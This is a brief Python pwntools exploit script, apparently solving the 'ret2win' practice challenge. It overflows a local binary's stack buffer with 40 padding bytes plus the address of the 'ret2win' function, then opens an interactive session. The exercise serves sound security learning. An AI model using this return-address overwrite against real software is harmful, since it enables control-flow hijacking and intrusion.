#!/usr/bin/python

import os
from pwn import *

e = ELF('./ret2win')
r = process(e.path)

payload = 'A' * 40	# offset
payload += p64(e.symbols['ret2win'])

r.recvuntil('>')
r.sendline(payload)
r.interactive()
